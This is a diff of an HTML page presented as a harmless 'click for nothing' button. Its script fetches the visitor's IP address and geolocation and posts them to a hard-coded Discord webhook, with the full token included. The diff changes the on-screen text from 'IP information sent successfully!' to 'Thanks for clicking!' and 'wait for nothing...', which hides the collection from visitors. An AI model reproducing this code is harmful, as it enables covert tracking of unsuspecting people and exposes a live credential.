@@ -12,11 +12,7 @@
             text-align: center;
             padding: 50px;
             margin: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden; /* Disable scrolling */
+            overflow: hidden; /* Disable scroll */
         }
         h1 {
             font-size: 2.5em;
@@ -31,13 +27,10 @@
             cursor: pointer;
             font-size: 18px;
             border-radius: 5px;
-            transition: background-color 0.3s, transform 0.2s;
+            transition: background-color 0.3s, transform 0.3s;
         }
         button:hover {
             background-color: #d63447;
-        }
-        button:active {
-            transform: scale(0.95);
         }
         #loading {
             display: none;
@@ -50,37 +43,36 @@
             font-size: 1.2em;
             color: #e0e0e0;
         }
+        /* Animation effect */
+        .animate {
+            transform: scale(0.9);
+        }
     </style>
 </head>
 <body>
-    <div>
-        <h1>Click for Nothing</h1>
-        <button id="sendInfoButton">Click Me!</button>
-        <div id="loading">Sending...</div>
-        <div id="message"></div>
-    </div>
+    <h1>Click the button for nothing</h1>
+    <button id="sendInfoButton">click me!</button>
+    <div id="loading">wait for nothing...</div>
+    <div id="message"></div>
 
     <script>
         document.getElementById("sendInfoButton").addEventListener("click", function() {
+            const button = this;
+            button.classList.add("animate"); // Add animation class
             document.getElementById("loading").style.display = "block";
             document.getElementById("message").innerText = "";
 
+            // Fetch IP Address
             fetch("https://api.ipify.org?format=json")
                 .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to fetch IP address');
-                    }
-                    return response.json();
+                    return response.json(); // Return JSON directly
                 })
                 .then(ipData => {
                     const ip = ipData.ip;
                     return fetch(`https://ipapi.co/${ip}/json/`);
                 })
                 .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to fetch IP details');
-                    }
-                    return response.json();
+                    return response.json(); // Return JSON directly
                 })
                 .then(data => {
                     const webhookUrl = 'https://discord.com/api/webhooks/1302270863206387845/a2WPDa6eWWgHRH3UOHX5kccg-demTyZUTyOVKzpplCEz4mDpdds4jf_5Ke-TyGAE0d9z';
@@ -89,24 +81,22 @@
                     };
                     return fetch(webhookUrl, {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(message)
                     });
                 })
                 .then(response => {
+                    button.classList.remove("animate"); // Remove animation class
                     document.getElementById("loading").style.display = "none";
-                    if (!response.ok) {
-                        throw new Error('Failed to send message to Discord');
-                    }
-                    document.getElementById("message").innerText = 'IP information sent successfully!';
+                    if (!response.ok) throw new Error('Error sending message');
+                    document.getElementById("message").innerText = 'Thanks for clicking!';
                 })
                 .catch(error => {
+                    button.classList.remove("animate"); // Remove animation class
                     document.getElementById("loading").style.display = "none";
-                    document.getElementById("message").innerText = 'Error occurred. Please try again.';
+                    document.getElementById("message").innerText = 'Error occurred. Please try again.'; // Generic error message
                 });
         });
     </script>
 </body>
-    </html>
+</html>
